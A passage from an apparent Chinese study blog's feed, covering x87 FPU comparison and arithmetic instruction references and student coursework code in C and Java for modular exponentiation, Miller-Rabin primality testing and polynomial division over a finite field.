ST(0),ST(i)  ST(0)-ST(1)并出栈   机器码  DF F0iii  FCOM   real4 ptr mem  ST(0)-实数mem                      机器码  D8 mm010mmm  FCOM   real8 ptr mem  ST(0)-实数mem                      机器码  DC mm010mmm    FICOM   word ptr mem  ST(0)-整数mem                      机器码  DE mm010mmm  FICOM  dword ptr mem  ST(0)-整数mem                      机器码  DA mm010mmm  FICOMP  word ptr mem  ST(0)-整数mem并出栈               机器码  DE mm011mmm  FICOMP dword ptr mem  ST(0)-整数mem并出栈               机器码  DA mm011mmm    FTST                  ST(0)-0                          机器码  D9 E4  FUCOM  ST(i)          ST(0)-ST(i)                      机器码  DD E0iii  FUCOMP ST(i)          ST(0)-ST(i)并出栈                   机器码  DD E1iii  FUCOMPP               ST(0)-ST(1)并二次出栈             机器码  DA E9  FXAM                  ST(0)规格类型                    机器码  D9 E5  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、运算指令"><a href="#四、运算指令" class="headerlink" title="四、运算指令"></a>四、运算指令</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">FADD                  把目的操作数 (直接接在指令后的变量或堆栈缓存器) 与来源操作数 (接在目的操作数后的变量或堆栈缓存器)  相加，并将结果存入目的操作数  FADDP  ST(i),ST       这个指令是使目的操作数加上 ST  缓存器，并弹出 ST 缓存器，而目的操作数必须是堆栈缓存器的其中之一，最后不管目的操作数为何，经弹出一次后，目的操作数会变成上一个堆栈缓存器了  FIADD                 FIADD 是把 ST   加上来源操作数，然后再存入 ST 缓存器，来源操作数必须是字组整数或短整数形态的变数    FSUB                  减  FSUBP  FSUBR                 减数与被减数互换  FSUBRP  FISUB  FISUBR    FMUL                  乘  FMULP  FIMUL    FDIV                  除  FDIVP  FDIVR  FDIVRP  FIDIV  FIDIVR    FCHS                  改变 ST 的正负值    FABS                  把 ST  之值取出，取其绝对值后再存回去。    FSQRT                 将 ST  之值取出，开根号后再存回去。    FSCALE                这个指令是计算 ST*2^ST(1)之值，再把结果存入 ST 里而 ST(1)   之值不变。ST(1)  必须是在 -32768 到 32768 (-215 到 215 )之间的整数，如果超过这个范围计算结果无法确定，如果不是整数 ST(1)    会先向零舍入成整数再计算。所以为安全起见，最好是由字组整数载入到 ST(1) 里。    FRNDINT               这个指令是把 ST 的数值舍入成整数，FPU    提供四种舍入方式，由 FPU 的控制字组(control    word)中的 RC 两个位决定                            RC    舍入控制                            00    四舍五入                            01    向负无限大舍入                            10    向正无限大舍入                            11    向零舍去  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="学习" scheme="http://www.blog.yln956.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>信安数学基础C语言代码</title>
    <link href="http://www.blog.yln956.top/2020/12/03/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/"/>
    <id>http://www.blog.yln956.top/2020/12/03/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/</id>
    <published>2020-12-03T11:43:13.000Z</published>
    <updated>2021-01-02T11:25:58.273Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="模重复平方计算法"><a href="#模重复平方计算法" class="headerlink" title="模重复平方计算法"></a>模重复平方计算法</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;math.h&gt; int main()&#123;int s&#x3D;1,k,b&#x3D;7,m&#x3D;113,t;int num,n, c, i &#x3D; 0;    int a[32];    printf(&quot;输入学号：&quot;);    scanf(&quot;%d&quot;, &amp;num);    n &#x3D; num;    while (num&gt;0)    &#123;        c &#x3D; (num % 2);        a[i] &#x3D; c;        num &#x3D; num &#x2F; 2;        i++;    &#125;    k&#x3D;i;    printf(&quot;学号%d转换成二进制数是：&quot;, n);    for (i--; i &gt;&#x3D; 0; i--)                   printf(&quot;%d&quot;, a[i]);    printf(&quot;\n&quot;);for(i&#x3D;0;i&lt;k;i++)&#123;if(a[i]&#x3D;&#x3D;1)&#123;s&#x3D;(s*b)%m;&#125;t&#x3D;pow(2,i);printf(&quot;7^%d &#x3D; %d (mod %d)\n&quot;,t,b,m);b&#x3D;(b*b)%m;&#125;printf(&quot;\n7^%d &#x3D; %d (mod %d)\n&quot;,n,s,m);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Miller-Rabin素性检测算法"><a href="#Miller-Rabin素性检测算法" class="headerlink" title="Miller -Rabin素性检测算法"></a>Miller -Rabin素性检测算法</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">int</span> <span class="token function">getmod</span><span class="token punctuation">(</span><span class="token keyword">int</span> b<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//模重复平方</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>sign<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">;</span><span class="token keyword">int</span> s<span class="token punctuation">,</span>t<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>h<span class="token punctuation">,</span>h1<span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"信安实验191，2019122061，颜礼能\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入要检验的数："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"求模使用的第一题的模重复平方计算法\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d是合数"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>num<span class="token operator">=</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>num<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sign<span class="token operator">++</span><span class="token punctuation">;</span>num<span class="token operator">=</span>num<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token operator">=</span>sign<span class="token punctuation">;</span>t<span class="token operator">=</span>num<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"s=%d,t=%d\n"</span><span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">sqrt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>h<span class="token operator">=</span><span class="token function">getmod</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>t<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n当b=%d，"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>s<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>h1<span class="token operator">=</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token function">getmod</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span>h1<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b^%d^%d=%d，"</span><span class="token punctuation">,</span>t<span class="token punctuation">,</span>j<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> b <span class="token operator">==</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是素数\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>s<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>b<span class="token operator">!=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是合数\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token operator">==</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是素数\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"结论：%d是素数\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">getmod</span><span class="token punctuation">(</span><span class="token keyword">int</span> b<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>t<span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> c<span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>num<span class="token operator">=</span>n<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>num<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c <span class="token operator">=</span> <span class="token punctuation">(</span>num <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>num <span class="token operator">=</span> num <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>k<span class="token operator">=</span>i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token operator">%</span>m<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>t<span class="token operator">=</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token punctuation">(</span>b<span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token operator">%</span>m<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span>  <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> ax <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> bx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> rx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>        <span class="token comment">//输入的数字转换成字符数组</span>        <span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入域(输入2表示域F2[X]):"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入ax(101011表示X^5+X^3+X+1):"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arraya <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//转成数字数组</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>a<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            ax<span class="token punctuation">.</span><span class="token function">addElement</span><span class="token punctuation">(</span>arraya<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入bx(1111表示X^3+X^2+X+1)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayb <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>b<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            bx<span class="token punctuation">.</span><span class="token function">addElement</span><span class="token punctuation">(</span>arrayb<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//输出ax，bx代表的多项式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"ax = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Invert</span><span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"bx = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Invert</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Euclidean</span><span class="token punctuation">(</span>ax<span class="token punctuation">,</span>bx<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Euclidean</span><span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> ax<span class="token punctuation">,</span><span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> bx<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> al <span class="token operator">=</span> ax<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bl <span class="token operator">=</span> bx<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> cx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> tx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token class-name">Invert</span><span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>al<span class="token operator">-</span>bl<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> cx0<span class="token operator">=</span><span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">-</span>count<span class="token operator">*</span>bx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cx0<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>        cx0<span class="token operator">=</span><span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">-</span>count<span class="token operator">*</span>bx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                    cx<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> ax0 <span class="token operator">=</span> count<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>bl<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ax0<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        ax<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> <span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">-</span>ax0<span class="token operator">*</span>bx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>                     ax<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Invert</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">")("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Invert</span><span class="token punctuation">(</span>cx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">") + ("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Invert</span><span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">") "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//vector->多项式输出</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Invert</span><span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> asize <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>asize<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token 